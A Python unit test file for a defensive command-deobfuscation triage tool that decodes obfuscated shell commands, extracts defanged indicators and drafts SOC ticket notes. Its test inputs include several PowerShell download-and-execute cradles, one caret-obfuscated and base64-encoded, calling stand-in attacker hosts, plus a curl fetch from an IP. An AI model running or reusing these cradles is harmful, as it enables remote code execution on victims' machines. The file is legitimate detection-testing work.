import base64
import io
import unittest
from contextlib import redirect_stdout
from unittest.mock import patch

from cmd_unmask import unmask_command
from cmd_unmask.cli import main


class TestOperatorUxAndVisualCli(unittest.TestCase):
    def test_pretty_default_format_renders_four_sections_and_layer_timeline_without_node_ids(self) -> None:
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        cmd = f"p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc {b64}"

        buf = io.StringIO()
        with redirect_stdout(buf):
            exit_code = main(["-c", cmd, "--no-color"])
        out = buf.getvalue()

        self.assertEqual(exit_code, 0)
        # Box-drawing header and tree markers
        self.assertIn("╔", out)
        self.assertIn("├─►", out)
        # Four required sections
        self.assertIn("[1] UNMASKING TIMELINE (LAYER-BY-LAYER)", out)
        self.assertIn("[2] EXTRACTED IOCs (DEFANGED)", out)
        self.assertIn("[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)", out)
        self.assertIn("[4] READY-TO-PASTE SOC TICKET NOTE", out)

        # Human-readable step labels and intermediate payloads
        self.assertIn("Step 0 [Raw Input]", out)
        self.assertIn("Step 1 [Shell Normalizer]", out)
        self.assertIn("Base64 UTF-16LE Decoded", out)
        self.assertIn(inner, out)

        # No raw internal graph IDs or '(from Layer N' labels in pretty output
        self.assertNotIn("node_0 -> node_1", out)
        self.assertNotIn("(from Layer ", out)
        # No ANSI escape codes when --no-color is passed
        self.assertNotIn("\x1b[", out)

        # Section [4] uses clean horizontal dividers without left vertical border characters
        sec4 = out.split("[4] READY-TO-PASTE SOC TICKET NOTE")[1]
        self.assertIn("────────", sec4)
        self.assertNotIn("│", sec4)
        self.assertNotIn("┌", sec4)
        self.assertNotIn("└", sec4)
        # Raw command (>90 chars) is truncated in the ticket note
        self.assertIn(f"chars total)", sec4)
        # Unmasked Cmd is on its own indented line
        self.assertIn(f"Unmasked Cmd  :\n  powershell.exe -NoP -W Hidden -c {inner}", sec4)
        # Multi-line bullet lists for IOCs and MITRE ATT&CK
        self.assertIn("  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1", sec4)
        self.assertIn("  - [DOMAIN] c2[.]evil[.]example", sec4)
        self.assertIn("  - T1059.001 : ", sec4)

    def test_url_authority_domain_extracted_as_separate_domain_ioc(self) -> None:
        verdict = unmask_command(
            "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://sub.bad-domain.org:8443/a.ps1')"
        )
        domains = [i for i in verdict.iocs if i.ioc_type == "domain"]
        self.assertTrue(any(d.raw_value == "sub.bad-domain.org" for d in domains))
        self.assertTrue(any(d.defanged_value == "sub[.]bad-domain[.]org" for d in domains))

        # URL with IPv4 host should not produce a bogus domain IOC
        verdict_ip = unmask_command("curl http://198.51.100.99:8080/sh")
        domains_ip = [i for i in verdict_ip.iocs if i.ioc_type == "domain"]
        self.assertEqual(domains_ip, [])
        ipv4s = [i for i in verdict_ip.iocs if i.ioc_type == "ipv4"]
        self.assertTrue(any(ip.raw_value == "198.51.100.99" for ip in ipv4s))

    def test_paste_flag_and_copy_note_flag(self) -> None:
        clipboard_cmd = "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://paste.evil.org/x')"
        copied_notes: list[str] = []

        buf = io.StringIO()
        with (
            patch("cmd_unmask.cli.get_clipboard_text", return_value=clipboard_cmd),
            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied_notes.append(txt) or True),
            redirect_stdout(buf),
        ):
            exit_code = main(["--paste", "--copy-note", "--no-color"])

        self.assertEqual(exit_code, 0)
        self.assertIn("hxxp://paste[.]evil[.]org/x", buf.getvalue())
        self.assertEqual(len(copied_notes), 1)
        self.assertIn("hxxp://paste[.]evil[.]org/x", copied_notes[0])
        self.assertIn("T1105", copied_notes[0])

    def test_interactive_tty_prompt_and_clipboard_fallback(self) -> None:
        # Case 1: User types a command at the interactive prompt
        buf1 = io.StringIO()
        err1 = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("builtins.input", return_value="whoami /all"),
            redirect_stdout(buf1),
            patch("sys.stderr", err1),
        ):
            code1 = main(["--no-color"])
        self.assertEqual(code1, 0)
        self.assertIn("whoami /all", buf1.getvalue())

        # Case 2: User presses Enter at prompt -> falls back to clipboard
        buf2 = io.StringIO()
        err2 = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("builtins.input", return_value=""),
            patch("cmd_unmask.cli.get_clipboard_text", return_value="hostname"),
            redirect_stdout(buf2),
            patch("sys.stderr", err2),
        ):
            code2 = main(["--no-color"])
        self.assertEqual(code2, 0)
        self.assertIn("hostname", buf2.getvalue())

        # Case 3: Explicit --format markdown still renders clean Markdown without node_0 -> node_1
        buf_md = io.StringIO()
        with redirect_stdout(buf_md):
            code_md = main(["-c", "p^o^w^e^r^s^h^e^l^l -c Write-Host hi", "--format", "markdown"])
        self.assertEqual(code_md, 0)
        self.assertIn("## Triage Verdict", buf_md.getvalue())
        self.assertIn("Step 1 [Shell Normalizer]", buf_md.getvalue())
        self.assertNotIn("node_0 -> node_1", buf_md.getvalue())


if __name__ == "__main__":
    unittest.main()
